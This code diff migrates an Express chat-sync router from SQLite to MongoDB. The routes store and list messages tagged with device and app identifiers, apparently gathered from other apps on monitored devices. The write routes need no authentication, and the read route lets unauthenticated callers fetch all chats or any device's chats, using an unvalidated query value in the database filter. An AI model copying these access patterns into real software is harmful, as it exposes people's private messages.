@@ -1,11 +1,11 @@
 const express = require('express');
 const router = express.Router();
-const db = require('../database/init');
+const { getDb } = require('../database/mongodb');
 const websocketService = require('../services/websocketService');
 const { authenticate, optionalAuth } = require('../middleware/auth');
 
 // POST /api/chats - Single chat
-router.post('/', (req, res) => {
+router.post('/', async (req, res) => {
     try {
         const chat = req.body;
         
@@ -17,22 +17,28 @@ router.post('/', (req, res) => {
             });
         }
         
-        // Insert chat
-        const stmt = db.prepare(`INSERT INTO chats 
-            (id, deviceId, appPackage, appName, chatIdentifier, text, timestamp, synced)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)`);
+        const db = getDb();
+        const chatDoc = {
+            id: chat.id,
+            deviceId: chat.deviceId || null,
+            appPackage: chat.appPackage,
+            appName: chat.appName,
+            chatIdentifier: chat.chatIdentifier || null,
+            text: chat.text,
+            timestamp: chat.timestamp || Date.now(),
+            synced: true, // Mark as synced
+            syncAttempts: 0,
+            lastSyncAttempt: null,
+            errorMessage: null,
+            createdAt: Math.floor(Date.now() / 1000)
+        };
         
-        stmt.run(
-            chat.id,
-            chat.deviceId || null,
-            chat.appPackage,
-            chat.appName,
-            chat.chatIdentifier || null,
-            chat.text,
-            chat.timestamp || Date.now(),
-            1 // Mark as synced
+        // Use replaceOne with upsert for INSERT OR REPLACE behavior
+        await db.collection('chats').replaceOne(
+            { id: chat.id },
+            chatDoc,
+            { upsert: true }
         );
-        stmt.finalize();
         
         // Broadcast WebSocket update
         if (chat.deviceId) {
@@ -53,7 +59,7 @@ router.post('/', (req, res) => {
 });
 
 // POST /api/chats/batch - Batch chats
-router.post('/batch', (req, res) => {
+router.post('/batch', async (req, res) => {
     try {
         const chats = req.body;
         
@@ -64,46 +70,40 @@ router.post('/batch', (req, res) => {
             });
         }
         
-        const stmt = db.prepare(`INSERT OR REPLACE INTO chats 
-            (id, deviceId, appPackage, appName, chatIdentifier, text, timestamp, synced)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)`);
+        const db = getDb();
+        const operations = chats.map(chat => ({
+            replaceOne: {
+                filter: { id: chat.id },
+                replacement: {
+                    id: chat.id,
+                    deviceId: chat.deviceId || null,
+                    appPackage: chat.appPackage,
+                    appName: chat.appName,
+                    chatIdentifier: chat.chatIdentifier || null,
+                    text: chat.text,
+                    timestamp: chat.timestamp || Date.now(),
+                    synced: true,
+                    syncAttempts: 0,
+                    lastSyncAttempt: null,
+                    errorMessage: null,
+                    createdAt: Math.floor(Date.now() / 1000)
+                },
+                upsert: true
+            }
+        }));
         
-        db.serialize(() => {
-            db.run('BEGIN TRANSACTION');
-            
-            chats.forEach(chat => {
-                stmt.run(
-                    chat.id,
-                    chat.deviceId || null,
-                    chat.appPackage,
-                    chat.appName,
-                    chat.chatIdentifier || null,
-                    chat.text,
-                    chat.timestamp || Date.now(),
-                    1
-                );
-                
-                // Broadcast WebSocket update for each chat
-                if (chat.deviceId) {
-                    websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
-                }
-            });
-            
-            db.run('COMMIT', (err) => {
-                if (err) {
-                    console.error('Error committing batch:', err);
-                    return res.status(500).json({
-                        success: false,
-                        message: 'Error saving batch'
-                    });
-                }
-                
-                stmt.finalize();
-                res.json({
-                    success: true,
-                    message: `Saved ${chats.length} chats`
-                });
-            });
+        await db.collection('chats').bulkWrite(operations);
+        
+        // Broadcast WebSocket updates for each chat
+        chats.forEach(chat => {
+            if (chat.deviceId) {
+                websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
+            }
+        });
+        
+        res.json({
+            success: true,
+            message: `Saved ${chats.length} chats`
         });
     } catch (error) {
         console.error('Error saving batch:', error);
@@ -115,7 +115,7 @@ router.post('/batch', (req, res) => {
 });
 
 // GET /api/chats - Get chats (with device filtering)
-router.get('/', optionalAuth, (req, res) => {
+router.get('/', optionalAuth, async (req, res) => {
     try {
         const user = req.user || {};
         const role = user.role;
@@ -124,45 +124,36 @@ router.get('/', optionalAuth, (req, res) => {
         
         const page = parseInt(req.query.page) || 1;
         const limit = parseInt(req.query.limit) || 50;
-        const offset = (page - 1) * limit;
+        const skip = (page - 1) * limit;
         
-        let query = 'SELECT * FROM chats WHERE 1=1';
-        const params = [];
+        const db = getDb();
+        const filter = {};
         
         // Device owners can only see chats from their assigned device
         if (role === 'device_owner' && assignedDeviceId) {
-            query += ' AND deviceId = ?';
-            params.push(assignedDeviceId);
+            filter.deviceId = assignedDeviceId;
         } else if (deviceId) {
             // Admin can filter by deviceId
-            query += ' AND deviceId = ?';
-            params.push(deviceId);
+            filter.deviceId = deviceId;
         }
         
-        query += ' ORDER BY timestamp DESC LIMIT ? OFFSET ?';
-        params.push(limit, offset);
+        const chats = await db.collection('chats')
+            .find(filter)
+            .sort({ timestamp: -1 })
+            .limit(limit)
+            .skip(skip)
+            .toArray();
         
-        db.all(query, params,
-            (err, rows) => {
-                if (err) {
-                    console.error('Error fetching chats:', err);
-                    return res.status(500).json({
-                        success: false,
-                        message: 'Error fetching chats'
-                    });
-                }
-                
-                const chats = rows.map(row => ({
-                    ...row,
-                    synced: row.synced === 1
-                }));
-                
-                res.json({
-                    success: true,
-                    data: chats
-                });
-            }
-        );
+        // Convert synced boolean back to number format if needed (for compatibility)
+        const formattedChats = chats.map(chat => ({
+            ...chat,
+            synced: chat.synced ? 1 : 0
+        }));
+        
+        res.json({
+            success: true,
+            data: formattedChats
+        });
     } catch (error) {
         console.error('Error fetching chats:', error);
         res.status(500).json({
